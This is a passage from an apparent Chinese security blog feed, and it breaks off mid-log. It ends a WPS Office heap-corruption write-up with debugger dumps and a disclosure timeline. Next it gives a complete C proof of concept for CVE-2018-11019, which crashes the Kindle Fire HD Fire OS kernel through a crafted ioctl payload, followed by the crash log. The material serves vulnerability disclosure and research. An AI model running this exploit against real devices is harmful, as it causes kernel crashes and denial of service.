kso!drawing::SingleVisualRenderer::draw+0x000001e1</span><br><span class="line">    6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046</span><br><span class="line">    6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a</span><br><span class="line">    680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1</span><br><span class="line">    6d0e36df kso!AbstractVisual::visualEvent+0x00000051</span><br><span class="line">    6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f</span><br><span class="line">    6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e</span><br><span class="line"></span><br><span class="line">0:000&gt; dt _DPH_BLOCK_INFORMATION cc780e18-0x20</span><br><span class="line">verifier!_DPH_BLOCK_INFORMATION</span><br><span class="line">   +0x000 StartStamp       : 0xc0c0c0c0</span><br><span class="line">   +0x004 Heap             : 0xc0c0c0c0 Void</span><br><span class="line">   +0x008 RequestedSize    : 0xc0c0c0c0</span><br><span class="line">   +0x00c ActualSize       : 0xc0c0c0c0</span><br><span class="line">   +0x010 Internal         : _DPH_BLOCK_INTERNAL_INFORMATION</span><br><span class="line">   +0x018 StackTrace       : 0xc0c0c0c0 Void</span><br><span class="line">   +0x01c EndStamp         : 0xc0c0c0c0</span><br></pre></td></tr></table></figure>

<p>段中的最后一个堆条目通常是一个空闲块。堆块的状态指示为空闲块。堆块声明前一个块的大小为00108，而当前块的大小为00a30。前一块报告其自身大小为0x20字节，不匹配。位置为05f61000的堆块的使用似乎是该堆块的使用导致以下块的元数据损坏的可能性。堆块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0:000&gt; !heap -a 05f60000 </span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   05f60000 </span><br><span class="line">    Segment at 05f60000 to 0605f000 (00001000 bytes committed)</span><br><span class="line">    Flags:                00000002</span><br><span class="line">    ForceFlags:           00000000</span><br><span class="line">    Granularity:          8 bytes</span><br><span class="line">    Segment Reserve:      00100000</span><br><span class="line">    Segment Commit:       00002000</span><br><span class="line">    DeCommit Block Thres: 00000200</span><br><span class="line">    DeCommit Total Thres: 00002000</span><br><span class="line">    Total Free Size:      00000146</span><br><span class="line">    Max. Allocation Size: fffdefff</span><br><span class="line">    Lock Variable at:     05f60258</span><br><span class="line">    Next TagIndex:        0000</span><br><span class="line">    Maximum TagIndex:     0000</span><br><span class="line">    Tag Entries:          00000000</span><br><span class="line">    PsuedoTag Entries:    00000000</span><br><span class="line">    Virtual Alloc List:   05f6009c</span><br><span class="line">    Uncommitted ranges:   05f6008c</span><br><span class="line">            05f61000: 000fe000  (1040384 bytes)</span><br><span class="line">    FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8  </span><br><span class="line">        05f605b0: 00108 . 00a30 [100] - free</span><br><span class="line"></span><br><span class="line">    Segment00 at 05f60000:</span><br><span class="line">        Flags:           00000000</span><br><span class="line">        Base:            05f60000</span><br><span class="line">        First Entry:     05f604a8</span><br><span class="line">        Last Entry:      0605f000</span><br><span class="line">        Total Pages:     000000ff</span><br><span class="line">        Total UnCommit:  000000fe</span><br><span class="line">        Largest UnCommit:00000000</span><br><span class="line">        UnCommitted Ranges: (1)</span><br><span class="line"></span><br><span class="line">    Heap entries for Segment00 in Heap 05f60000</span><br><span class="line">         address: psize . size  flags   state (requested size)</span><br><span class="line">        05f60000: 00000 . 004a8 [101] - busy (4a7)</span><br><span class="line">        05f604a8: 004a8 . 00108 [101] - busy (107) Internal </span><br><span class="line">        05f605b0: 00108 . 00a30 [100]</span><br><span class="line">        05f60fe0: 00a30 . 00020 [111] - busy (1d)</span><br><span class="line">        05f61000:      000fe000      - uncommitted bytes.</span><br><span class="line"></span><br><span class="line">0:000&gt; dd 05f60fe0</span><br><span class="line">05f60fe0  a9b3c836 03007087 05f6008c 05f6008c</span><br><span class="line">05f60ff0  05f60038 05f60038 05f61000 000fe000</span><br><span class="line">05f61000  ???????? ???????? ???????? ????????</span><br><span class="line">05f61010  ???????? ???????? ???????? ????????</span><br><span class="line">05f61020  ???????? ???????? ???????? ????????</span><br><span class="line">05f61030  ???????? ???????? ???????? ????????</span><br><span class="line">05f61040  ???????? ???????? ???????? ????????</span><br><span class="line">05f61050  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>

<h2 id="披露时间表"><a href="#披露时间表" class="headerlink" title="披露时间表"></a>披露时间表</h2><p>该漏洞于2020年8月报告。披露时间表：</p>
<ul>
<li>2020-08-04-将电子邮件发送到公开提供的WPS的各种邮件列表（销售和支持）。</li>
<li>2020-08-10-WPS团队回应该报告可以转发给他们。</li>
<li>2020-08-11-要求进一步的信息，例如咨询和向适当的渠道披露等。</li>
<li>2020-08-17-根据先前的要求与WPS团队进行跟进。</li>
<li>2020-08-18-WPS团队做出回应，他们会照顾好它，并转交给开发团队。</li>
<li>2020-08-18-通过电子邮件提供技术报告和概念验证（未加密）。</li>
<li>2020-08-25-WPS跟进报告进度。</li>
<li>2020-08-26-WPS更新说此问题已转发给开发团队。</li>
<li>2020-08-28-WPS发送了一封电子邮件，指出该问题已在最新的下载版本11.2.0.9403中得到解决。</li>
<li>2020-08-28-针对提供的PoC测试了新版本，并确认问题已解决。</li>
<li>2020-08-28-向WPS团队寻求咨询或更改日志更新。</li>
<li>2020-08-31-WPS团队通知他们不再更新或维护任何安全公告。</li>
<li>2020-09-03-漏洞写信 要求CVE。</li>
</ul>
<p>参考链接：<a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2018-11019）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11019%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）是美国亚马逊（Amazon）公司的一款Fire OS平板电脑设备。Fire OS是运行在其中的一套专用于Amazon设备的基于Android开发的移动操作系统。kernel是其中的一个内核组件。 Amazon Kindle Fire HD(3rd) Fire OS 4.5.5.3版本中的kernel组件的kernel/omap/drivers/misc/gcx/gcioctl/gcif.c文件存在安全漏洞。攻击者可借助3221773726命令利用该漏洞注入特制的参数，造成内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<p>-</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is dsscomp_setup_dispc_data.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/dsscomp.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/dsscomp&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">1118064517</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123;</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000003</span>,</span><br><span class="line">    <span class="number">0x5d200040</span>,</span><br><span class="line">    <span class="number">0x79900008</span>,</span><br><span class="line">    <span class="number">0x8f5928bd</span>,</span><br><span class="line">    <span class="number">0x78b02422</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xf4c50400</span>,</span><br><span class="line">    <span class="number">0x007fffff</span>,</span><br><span class="line">    <span class="number">0x8499f562</span>,</span><br><span class="line">    <span class="number">0xffff0400</span>,</span><br><span class="line">    <span class="number">0x001b131d</span>,</span><br><span class="line">    <span class="number">0x60818210</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x9da9041c</span>,</span><br><span class="line">    <span class="number">0xcd980400</span>,</span><br><span class="line">    <span class="number">0x001f03f4</span>,</span><br><span class="line">    <span class="number">0x00000007</span>,</span><br><span class="line">    <span class="number">0x2a34003f</span>,</span><br><span class="line">    <span class="number">0x7c80d8f3</span>,</span><br><span class="line">    <span class="number">0x63102627</span>,</span><br><span class="line">    <span class="number">0xc73643a8</span>,</span><br><span class="line">    <span class="number">0xa28f0665</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x689e57b4</span>,</span><br><span class="line">    <span class="number">0x01ff0008</span>,</span><br><span class="line">    <span class="number">0x5e7324b1</span>,</span><br><span class="line">    <span class="number">0xae3b003f</span>,</span><br><span class="line">    <span class="number">0x0b174d86</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0x21ffff37</span>,</span><br><span class="line">    <span class="number">0xceb367a4</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xec000f9e</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x000001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x0425c069</span>,</span><br><span class="line">    <span class="number">0x038cc3be</span>,</span><br><span class="line">    <span class="number">0x0000000f</span>,</span><br><span class="line">    <span class="number">0x00000080</span>,</span><br><span class="line">    <span class="number">0xe5790100</span>,</span><br><span class="line">    <span class="number">0x5b1bffff</span>,</span><br><span class="line">    <span class="number">0x0000d355</span>,</span><br><span class="line">    <span class="number">0x0000c685</span>,</span><br><span class="line">    <span class="number">0xa0070000</span>,</span><br><span class="line">    <span class="number">0x0010ffff</span>,</span><br><span class="line">    <span class="number">0x00a0ff00</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff490700</span>,</span><br><span class="line">    <span class="number">0x0832ad03</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x81f871c0</span>,</span><br><span class="line">    <span class="number">0x738019cb</span>,</span><br><span class="line">    <span class="number">0xbf47ffff</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x7f190f33</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8295769b</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0x869f2295</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xd673914f</span>,</span><br><span class="line">    <span class="number">0x05055800</span>,</span><br><span class="line">    <span class="number">0xed69b7d5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x0107ebbd</span>,</span><br><span class="line">    <span class="number">0xd214af8d</span>,</span><br><span class="line">    <span class="number">0xffff4a93</span>,</span><br><span class="line">    <span class="number">0x26450008</span>,</span><br><span class="line">    <span class="number">0x58df0000</span>,</span><br><span class="line">    <span class="number">0xd16db084</span>,</span><br><span class="line">    <span class="number">0x03ff30dd</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x209aff3b</span>,</span><br><span class="line">    <span class="number">0xe7850800</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0x30da815c</span>,</span><br><span class="line">    <span class="number">0x426f5105</span>,</span><br><span class="line">    <span class="number">0x0de109d7</span>,</span><br><span class="line">    <span class="number">0x2c1a65fc</span>,</span><br><span class="line">    <span class="number">0xfcb3d75f</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8066be5b</span>,</span><br><span class="line">    <span class="number">0x00000002</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x5cf232ec</span>,</span><br><span class="line">    <span class="number">0x680d1469</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000020</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xd1d12be8</span>,</span><br><span class="line">    <span class="number">0x02010200</span>,</span><br><span class="line">    <span class="number">0x01ffc16f</span>,</span><br><span class="line">    <span class="number">0xf6e237e6</span>,</span><br><span class="line">    <span class="number">0x007f0000</span>,</span><br><span class="line">    <span class="number">0x01ff08f8</span>,</span><br><span class="line">    <span class="number">0x000f00f9</span>,</span><br><span class="line">    <span class="number">0xbad07695</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbaff0000</span>,</span><br><span class="line">    <span class="number">0x24040040</span>,</span><br><span class="line">    <span class="number">0x00000006</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xbc2e9242</span>,</span><br><span class="line">    <span class="number">0x009f5f08</span>,</span><br><span class="line">    <span class="number">0x00800000</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff8800ff</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x000003f4</span>,</span><br><span class="line">    <span class="number">0x6faa8472</span>,</span><br><span class="line">    <span class="number">0x00000400</span>,</span><br><span class="line">    <span class="number">0xec857dd5</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000040</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0x3f004874</span>,</span><br><span class="line">    <span class="number">0x0000b77a</span>,</span><br><span class="line">    <span class="number">0xec9acb95</span>,</span><br><span class="line">    <span class="number">0xfacc0001</span>,</span><br><span class="line">    <span class="number">0xffff0001</span>,</span><br><span class="line">    <span class="number">0x0080ffff</span>,</span><br><span class="line">    <span class="number">0x3600ff03</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x8fff7d7f</span>,</span><br><span class="line">    <span class="number">0x6b87075a</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037</span><br><span class="line">[  164.802459] pgd &#x3D; c26ec000</span><br><span class="line">[  164.805664] [00000037] *pgd&#x3D;82f42831, *pte&#x3D;00000000, *ppte&#x3D;00000000</span><br><span class="line">[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM</span><br><span class="line">[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  164.834686] PC is at dev_ioctl+0x4ac&#x2F;0x10c4</span><br><span class="line">[  164.839416] LR is at down_timeout+0x40&#x2F;0x5c</span><br><span class="line">[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013</span><br><span class="line">[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04</span><br><span class="line">[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610</span><br><span class="line">[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f</span><br><span class="line">[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000</span><br><span class="line">[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015</span><br><span class="line">[  164.892303] </span><br><span class="line">[  164.892333] PC: 0xc0317868:</span><br><span class="line">[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f</span><br><span class="line">[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064</span><br><span class="line">[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060</span><br><span class="line">[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0</span><br><span class="line">[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070</span><br><span class="line">[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064</span><br><span class="line">[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064</span><br><span class="line">[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088</span><br><span class="line">[  164.982299] </span><br><span class="line">[  164.982330] LR: 0xc006e938:</span><br><span class="line">[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005</span><br><span class="line">[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4</span><br><span class="line">[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000</span><br><span class="line">[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794</span><br><span class="line">[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d</span><br><span class="line">[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008</span><br><span class="line">[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004</span><br><span class="line">[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d</span><br><span class="line">[  165.072265] </span><br><span class="line">[  165.072265] SP: 0xc25a1df0:</span><br><span class="line">[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610</span><br><span class="line">[  165.162353] </span><br><span class="line">[  165.162384] IP: 0xc25a1dd0:</span><br><span class="line">[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001</span><br><span class="line">[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff</span><br><span class="line">[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013</span><br><span class="line">[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8</span><br><span class="line">[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff</span><br><span class="line">[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920</span><br><span class="line">[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff</span><br><span class="line">[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580</span><br><span class="line">[  165.252441] </span><br><span class="line">[  165.252441] FP: 0xc25a1e84:</span><br><span class="line">[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff</span><br><span class="line">[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000</span><br><span class="line">[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40</span><br><span class="line">[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044</span><br><span class="line">[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000</span><br><span class="line">[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400</span><br><span class="line">[  165.342346] </span><br><span class="line">[  165.342376] R6: 0xc259ff80:</span><br><span class="line">[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00</span><br><span class="line">[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8</span><br><span class="line">[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  165.432342] </span><br><span class="line">[  165.432342] R7: 0xc0a25ad0:</span><br><span class="line">[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03</span><br><span class="line">[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005</span><br><span class="line">[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001</span><br><span class="line">[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001</span><br><span class="line">[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000</span><br><span class="line">[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000</span><br><span class="line">[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001</span><br><span class="line">[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8</span><br><span class="line">[  165.522186] </span><br><span class="line">[  165.522186] R9: 0xd8c0ac28:</span><br><span class="line">[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000</span><br><span class="line">[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000</span><br><span class="line">[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 